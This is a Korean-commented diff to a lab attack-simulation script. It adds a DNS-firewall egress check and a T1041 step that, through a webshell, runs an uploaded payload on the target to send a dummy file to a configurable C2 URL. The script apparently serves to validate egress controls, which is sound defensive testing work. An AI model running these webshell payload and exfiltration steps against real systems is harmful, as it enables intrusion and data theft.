@@ -6,6 +6,7 @@ SQLi 인증우회 → SSTI/업로드 RCE → 웹셸 지속성 → 리소스 하�
   3. T1505.003  S3 에 남는 업로드 파일을 재호출하는 stateless 웹셸
   4. 피벗       웹셸에서 IMDS 질의 — 임시 자격증명 획득 가능성만 로깅
   5. T1496      마이닝풀 DNS/TCP 연결 + 짧은 CPU 스핀
+  6. 검증       DNS 송신 통제(Resolver DNS Firewall) 동작 확인 — 질의 1회
 
 파괴 동작이 없어 전 단계를 플래그 없이 실행한다. S3 업로드 객체만 남고,
 그 key 는 recovery/webshell_keys.json 에 기록한다.
@@ -160,6 +161,123 @@ def step5_cryptojacking(c: WhsClient, via: str, mine_seconds: int) -> None:
 
 
 # ─────────────────────────────────────────────────────────────
+# 6. DNS 송신 통제 검증 (Route 53 Resolver DNS Firewall)
+# ─────────────────────────────────────────────────────────────
+def step6_dns_egress_check(c: WhsClient) -> None:
+    """
+    대상 호스트에서 지정 도메인을 한 번 조회하고 결과를 찍는다.
+
+    DNS Firewall 은 이름 해석 단계에서만 동작하므로, 통제가 걸렸는지는
+    질의 한 번으로 판정된다. 데이터를 보내지 않고 상태도 바꾸지 않는다.
+
+    DNS_PROBE_DOMAIN 이 비어 있으면 건너뛴다. DNS Firewall 설정 전에도
+    1~5 단계는 그대로 돌아가야 하기 때문이다.
+    """
+    banner(LOG, "STEP 6 — DNS 송신 통제 검증(Route 53 Resolver DNS Firewall)")
+
+    domain = common.env("DNS_PROBE_DOMAIN", "")
+    if not domain:
+        LOG.info("  [skip] DNS_PROBE_DOMAIN 미설정 — DNS Firewall 검증 생략")
+        LOG.info("         .env 에 검증용 도메인을 넣으면 이 단계가 실행된다.")
+        return
+
+    run_id = uuid.uuid4().hex[:12]
+    key = c.upload_payload("dnscheck.sh", TARGET=c.short_host(),
+                           DOMAIN=domain, RUN_ID=run_id)
+    out = c.run_payload_on_target(key, label="DNS 프로브", expect="DNSCHECK_BEGIN")
+
+    resolver = verdict = ""
+    for line in out.splitlines():
+        if line.startswith("RESOLVER "):
+            resolver = line.split(None, 1)[1].strip()
+        elif line.startswith("RESOLVE "):
+            verdict = line.split(None, 1)[1].strip()
+
+    LOG.info("  [+] 질의 도메인: %s (runid=%s)", domain, run_id)
+    LOG.info("      사용 리졸버: %s", resolver or "(확인 못 함)")
+
+    if verdict.startswith("OK"):
+        LOG.info("      결과: 해석 성공 — %s", verdict[3:].strip())
+        LOG.info("      → 쿼리 로그의 firewall_rule_action 으로 ALERT 여부를 판정한다.")
+        LOG.info("         (필드가 없으면 규칙 미적용, ALERT 면 기록만 하고 통과시킨 것)")
+    else:
+        LOG.info("      결과: 해석 실패 — 차단되었거나 도메인이 등록되지 않았다.")
+        LOG.info("      → 쿼리 로그에 BLOCK 이 있으면 DNS Firewall 이 막은 것이다.")
+
+    # VPC 리졸버가 아니면 DNS Firewall 평가 대상이 아니므로 결과 해석이 달라진다.
+    if resolver and not resolver.endswith(".2"):
+        LOG.warning("  [!] 리졸버가 VPC 리졸버(.2)가 아니다 — DNS Firewall 평가 대상이 아닐 수 있다.")
+
+    LOG.info("      확인 쿼리 (CloudWatch Logs Insights):")
+    LOG.info("        fields @timestamp, srcaddr, query_name, firewall_rule_action")
+    LOG.info("        | filter query_name like /%s/", domain.split(".")[0])
+    LOG.info("        | sort @timestamp desc | limit 20")
+
+
+# ─────────────────────────────────────────────────────────────
+# 7. 데이터 송신 확인 (T1041)
+# ─────────────────────────────────────────────────────────────
+def step7_data_egress(c: WhsClient) -> None:
+    """
+    실습 더미 파일 하나를 수신 서버로 보내고 결과를 찍는다.
+
+    6단계가 '이름 해석이 되는가'라면 이쪽은 '데이터가 실제로 나가는가'다.
+    DNS Firewall 이 BLOCK 이면 이름을 못 찾아 둘 다 실패한다 — 그게 의도된 결과다.
+
+    C2_URL 이 비어 있으면 건너뛴다.
+    """
+    banner(LOG, "STEP 7 — 데이터 송신 확인(T1041)")
+
+    url = common.env("C2_URL", "").rstrip("/")
+    if not url:
+        LOG.info("  [skip] C2_URL 미설정 — 데이터 송신 확인 생략")
+        return
+
+    src = common.env("C2_SRC_FILE", "/opt/whs-lab-data/orders.csv")
+    run_id = uuid.uuid4().hex[:12]
+
+    key = c.upload_payload("upload.sh", TARGET=c.short_host(),
+                           C2_URL=url, SRC_FILE=src, RUN_ID=run_id)
+    out = c.run_payload_on_target(key, label="데이터 송신", expect="UPLOAD_BEGIN")
+
+    if "REFUSED:" in out:
+        raise SystemExit(f"[!] 중단: 허용되지 않은 송신 경로 — {src}")
+    if "NO_SRC:" in out:
+        LOG.warning("  [!] %s 에 대상 파일이 없다 — 인프라에서 더미를 심어야 한다.", src)
+        return
+
+    size = http = resp = ""
+    for line in out.splitlines():
+        if line.startswith("SRC_SIZE "):
+            size = line.split(None, 1)[1].strip()
+        elif line.startswith("RESP HTTP "):
+            http = line.split()[-1]
+        elif line.startswith("RESP ") and "HTTP" not in line:
+            resp = line[5:].strip() or resp
+
+    LOG.info("  [+] 대상 파일: %s (%s bytes)", src, size or "?")
+    if http == "200":
+        LOG.info("  [+] 전송 성공 — HTTP 200, 응답: %s", resp or "(없음)")
+        LOG.info("      → 랩 VPC 밖으로 데이터가 실제로 나갔다.")
+        LOG.info("      수신 측 로그에 출발지가 NAT Gateway 주소로 남는다.")
+    elif http in ("", "000"):
+        LOG.info("  [=] 전송 실패 — 이름 해석 또는 연결 불가")
+        LOG.info("      → DNS Firewall 이 BLOCK 이면 정상적인 결과다.")
+        LOG.info("      응답: %s", resp or "(없음)")
+    else:
+        LOG.info("  [=] 전송 거부 — HTTP %s, 응답: %s", http, resp or "(없음)")
+
+    common.save_recovery(
+        HERE, "c2_egress.json",
+        json.dumps({"run_id": run_id, "url": url, "src": src,
+                    "size": size, "http": http,
+                    "target_host": c.target_host,
+                    "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
+                    "cleanup": "수신 서버의 저장 디렉터리를 비울 것"},
+                   indent=2, ensure_ascii=False).encode())
+
+
+# ─────────────────────────────────────────────────────────────
 # main
 # ─────────────────────────────────────────────────────────────
 def restore(bucket: str) -> None:
@@ -211,6 +329,8 @@ def main():
     step3_persistence(c)
     step4_imds_pivot(c, args.via)
     step5_cryptojacking(c, args.via, args.mine_seconds)
+    step6_dns_egress_check(c)
+    step7_data_egress(c)
 
     banner(LOG, "SCENARIO 2 종료", "로그: scenario2/scenario2.log")
 
